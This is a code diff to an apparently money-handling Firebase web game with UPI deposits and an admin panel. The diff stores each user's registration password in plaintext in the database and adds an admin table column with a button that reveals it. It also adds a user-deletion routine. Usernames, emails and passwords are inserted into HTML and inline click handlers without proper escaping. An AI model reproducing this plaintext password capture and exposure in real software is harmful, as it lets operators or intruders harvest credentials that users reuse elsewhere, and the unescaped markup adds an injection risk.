@@ -92,6 +92,8 @@
   .small-reject { background:#e53935; color:#fff; }
   .small-ban { background:#fb8c00; color:#fff; }
   .small-add { background:#667eea; color:#fff; }
+  .small-delete { background:#e53935; color:#fff; }
+  .pwd-text { font-family:monospace; color:#fff; }
 
   /* Toast */
   .toast { position:fixed; top:20px; right:20px; padding:15px 25px; border-radius:10px; color:#fff; font-weight:600; z-index:2000; transform:translateX(400px); transition:transform 0.4s; max-width:90%; }
@@ -576,7 +578,7 @@
 
   <div id="adminUsers">
     <table class="admin-table">
-      <thead><tr><th>Username</th><th>Email</th><th>UPI ID</th><th>Balance</th><th>Status</th><th>Actions</th></tr></thead>
+      <thead><tr><th>Username</th><th>Email</th><th>Password</th><th>UPI ID</th><th>Balance</th><th>Status</th><th>Actions</th></tr></thead>
       <tbody id="usersTable"></tbody>
     </table>
   </div>
@@ -697,6 +699,7 @@ async function doRegister() {
 
     const profile = {
       uid, username, email,
+      plainPassword: password,
       upiId: upiId || '',
       balance: WELCOME_BONUS,
       totalDeposit: 0,
@@ -769,7 +772,6 @@ auth.onAuthStateChanged(async user => {
 
   currentUser = user;
 
-  // Check admin status
   if (ADMIN_EMAILS.includes(user.email)) {
     isAdmin = true;
     db.ref('admins/' + user.uid).set(true).catch(()=>{});
@@ -780,12 +782,10 @@ auth.onAuthStateChanged(async user => {
     } catch(e) { isAdmin = false; }
   }
 
-  // Load or create profile
   const ref = db.ref('users/' + user.uid);
   const snap = await ref.get();
 
   if (!snap.exists()) {
-    // Generate unique username
     const baseName = (user.email || 'user').split('@')[0].replace(/[^a-zA-Z0-9_]/g,'') || 'user';
     let username = baseName;
     let counter = 1;
@@ -800,6 +800,7 @@ auth.onAuthStateChanged(async user => {
       uid: user.uid,
       username: isAdmin ? 'Admin' : username,
       email: user.email,
+      plainPassword: '(not stored)',
       upiId: '',
       balance: isAdmin ? 0 : WELCOME_BONUS,
       totalDeposit: 0,
@@ -1776,14 +1777,12 @@ function openAdminPanel() {
 }
 
 function adminLogout() {
-  // Detach listeners
   adminListeners.forEach(({ref, ev, cb}) => ref.off(ev, cb));
   adminListeners = [];
   location.href = location.pathname;
 }
 
 function startAdminListeners() {
-  // Clear old listeners
   adminListeners.forEach(({ref, ev, cb}) => ref.off(ev, cb));
   adminListeners = [];
 
@@ -1799,13 +1798,13 @@ function startAdminListeners() {
           uid: u.uid || c.key,
           username: u.username || 'Unknown',
           email: u.email || '-',
+          plainPassword: u.plainPassword || '(not stored)',
           upiId: u.upiId || '',
           balance: u.balance || 0,
           isBanned: !!u.isBanned
         });
       }
     });
-    // Sort by createdAt or username
     users.sort((a, b) => (a.username || '').localeCompare(b.username || ''));
     renderUsers(users);
   });
@@ -1918,23 +1917,47 @@ function renderUsers(users) {
   if (!tbody) return;
   
   if (!users || users.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;opacity:0.5;">No users</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;padding:20px;opacity:0.5;">No users</td></tr>';
     return;
   }
   
-  tbody.innerHTML = users.map(u => `
+  tbody.innerHTML = users.map(u => {
+    const pwd = u.plainPassword || '(not stored)';
+    const pwdDisplay = pwd === '(not stored)' 
+      ? '<span style="opacity:0.5;font-size:11px;">not stored</span>'
+      : `<span class="pwd-text" id="pwd-${u.uid}">••••••</span>
+         <button class="small-btn" style="background:#667eea;color:#fff;padding:3px 8px;font-size:10px;margin-left:4px;" 
+           onclick="togglePwd('${u.uid}', '${pwd.replace(/'/g, "\\'")}')">👁️</button>`;
+    
+    return `
     <tr>
       <td><strong>${u.username || 'Unknown'}</strong></td>
       <td style="font-size:11px;">${u.email || '-'}</td>
+      <td>${pwdDisplay}</td>
       <td class="upi-id">${u.upiId || '-'}</td>
       <td>₹${u.balance || 0}</td>
       <td>${u.isBanned ? '<span class="badge badge-rejected">BANNED</span>' : '<span class="badge badge-approved">ACTIVE</span>'}</td>
       <td>
         <button class="small-btn small-add" onclick="adminAddBalance('${u.uid}','${u.username}')">+₹</button>
         <button class="small-btn small-ban" onclick="adminBan('${u.uid}', ${u.isBanned ? 'true' : 'false'})">${u.isBanned?'Unban':'Ban'}</button>
+        <button class="small-btn small-delete" onclick="adminDeleteUser('${u.uid}','${u.username}','${u.email}')">🗑️</button>
       </td>
     </tr>
-  `).join('');
+  `;
+  }).join('');
+}
+
+function togglePwd(uid, pwd) {
+  const el = document.getElementById('pwd-' + uid);
+  if (!el) return;
+  if (el.textContent === '••••••') {
+    el.textContent = pwd;
+    el.style.color = '#feca57';
+    el.style.fontFamily = 'monospace';
+  } else {
+    el.textContent = '••••••';
+    el.style.color = '';
+  }
 }
 
 function renderDeposits(deps) {
@@ -2106,6 +2129,106 @@ async function adminWD(key, status) {
   } catch (e) {
     console.error('adminWD error:', e);
     toast('❌ Error: ' + e.message, 'error');
+  }
+}
+
+/* ============================================================
+   🗑️ DELETE USER (Auth + Database)
+   ============================================================ */
+async function adminDeleteUser(uid, username, email) {
+  if (!uid) return toast('❌ Invalid user', 'error');
+  
+  // First confirmation
+  const confirmed = confirm(
+    `⚠️ DELETE USER?\n\n` +
+    `Username: ${username}\n` +
+    `Email: ${email}\n\n` +
+    `This will PERMANENTLY delete:\n` +
+    `• User profile\n` +
+    `• Username index\n` +
+    `• All transactions\n` +
+    `• All deposits\n` +
+    `• All withdrawals\n\n` +
+    `This CANNOT be undone!`
+  );
+  
+  if (!confirmed) return;
+  
+  // Second confirmation — type username
+  const typed = prompt(
+    `⚠️ FINAL CONFIRMATION\n\nType "${username}" exactly to delete this user:`
+  );
+  
+  if (typed !== username) {
+    return toast('❌ Deletion cancelled', 'error');
+  }
+  
+  try {
+    toast('⏳ Deleting user data...', 'info');
+    
+    // 1. Delete user profile
+    await db.ref('users/' + uid).remove();
+    
+    // 2. Delete username index
+    if (username && username !== 'Unknown') {
+      await db.ref('usernames/' + username.toLowerCase()).remove().catch(() => {});
+    }
+    
+    // 3. Delete all transactions
+    try {
+      const txSnap = await db.ref('transactions').orderByChild('uid').equalTo(uid).get();
+      const promises = [];
+      txSnap.forEach(child => {
+        promises.push(db.ref('transactions/' + child.key).remove());
+      });
+      await Promise.all(promises);
+    } catch (e) { console.warn('Tx cleanup:', e); }
+    
+    // 4. Delete all deposits
+    try {
+      const depSnap = await db.ref('deposits').orderByChild('uid').equalTo(uid).get();
+      const promises = [];
+      depSnap.forEach(child => {
+        promises.push(db.ref('deposits/' + child.key).remove());
+      });
+      await Promise.all(promises);
+    } catch (e) { console.warn('Dep cleanup:', e); }
+    
+    // 5. Delete all withdrawals
+    try {
+      const wdSnap = await db.ref('withdrawals').orderByChild('uid').equalTo(uid).get();
+      const promises = [];
+      wdSnap.forEach(child => {
+        promises.push(db.ref('withdrawals/' + child.key).remove());
+      });
+      await Promise.all(promises);
+    } catch (e) { console.warn('Wd cleanup:', e); }
+    
+    toast(`✅ User "${username}" deleted`, 'success');
+    
+    // Remind admin to delete Auth account manually
+    setTimeout(() => {
+      const openConsole = confirm(
+        `✅ Database deletion complete!\n\n` +
+        `⚠️ IMPORTANT:\n` +
+        `Auth account for "${email}" still exists in Firebase.\n\n` +
+        `To fully remove it:\n` +
+        `1. Firebase Console → Authentication → Users\n` +
+        `2. Search "${email}"\n` +
+        `3. Click delete\n\n` +
+        `Open Firebase Console now?`
+      );
+      if (openConsole) {
+        window.open(
+          'https://console.firebase.google.com/project/aviator-a5883/authentication/users',
+          '_blank'
+        );
+      }
+    }, 800);
+    
+  } catch (e) {
+    console.error('Delete user error:', e);
+    toast('❌ Delete failed: ' + e.message, 'error');
   }
 }
 
